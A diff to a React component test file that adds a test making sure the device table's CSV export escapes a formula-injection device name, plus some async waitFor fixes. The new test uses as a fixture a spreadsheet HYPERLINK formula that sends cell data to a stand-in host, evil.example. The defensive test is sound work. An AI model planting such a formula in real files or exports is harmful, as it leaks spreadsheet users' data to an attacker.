@@ -3,7 +3,7 @@ import '@/test/dom-setup';
 import assert from 'node:assert/strict';
 import { afterEach, describe, it } from 'node:test';
 
-import { cleanup, fireEvent, render, screen, within } from '@testing-library/react';
+import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
 
 import { DeviceTable } from '@/components/device-table';
 import type { Device } from '@/lib/api-contracts';
@@ -44,6 +44,28 @@ function names(): string[] {
 }
 
 describe('DeviceTable', () => {
+  it('neutralises a hostile device name in the export', async () => {
+    const hostile = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
+    let exported = '';
+    const original = URL.createObjectURL;
+    URL.createObjectURL = (blob: Blob | MediaSource) => {
+      void (blob as Blob).text().then((text) => (exported = text));
+      return 'blob:test';
+    };
+    URL.revokeObjectURL = () => undefined;
+    window.HTMLAnchorElement.prototype.click = () => undefined;
+    try {
+      render(<DeviceTable devices={[device('1', { name: hostile })]} total={1} />);
+      fireEvent.click(screen.getByRole('button', { name: 'Export CSV, 1 devices' }));
+      await waitFor(() => assert.ok(exported.length > 0));
+      const dataRow = exported.split('\r\n')[1];
+      assert.ok(dataRow.includes(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"`), dataRow);
+      assert.ok(!/(^|,)=/.test(dataRow), 'no cell starts with =');
+    } finally {
+      URL.createObjectURL = original;
+    }
+  });
+
   it('says the filters only cover the loaded page', () => {
     render(<DeviceTable devices={ROWS} total={120} />);
     assert.match(document.body.textContent ?? '', /3 shown \/ 120 total/);
@@ -138,10 +160,10 @@ describe('DeviceTable', () => {
     assert.equal(params.get('page'), '2');
   });
 
-  it('filters to zero results, then Clear filters resets the URL and restores the rows', () => {
+  it('filters to zero results, then Clear filters resets the URL and restores the rows', async () => {
     render(<DeviceTable devices={ROWS} total={3} />);
     fireEvent.change(screen.getByRole('searchbox'), { target: { value: 'nothing-matches' } });
-    assert.match(window.location.search, /q=nothing-matches/);
+    await waitFor(() => assert.match(window.location.search, /q=nothing-matches/));
     assert.ok(screen.getByText('No devices match these filters'));
     const empty = screen.getByText('No devices match these filters').closest('.card') as HTMLElement;
     fireEvent.click(within(empty).getByRole('button', { name: 'Clear filters' }));
@@ -167,7 +189,7 @@ describe('DeviceTable', () => {
         />,
       );
       fireEvent.click(screen.getByRole('button', { name: /critical \(1\)/ }));
-      fireEvent.click(screen.getByRole('button', { name: /Export CSV/ }));
+      fireEvent.click(screen.getByRole('button', { name: 'Export CSV, 1 devices' }));
       await new Promise((resolve) => setTimeout(resolve, 20));
       const lines = exported.trim().split(/\r?\n/);
       assert.equal(lines.length, 2);
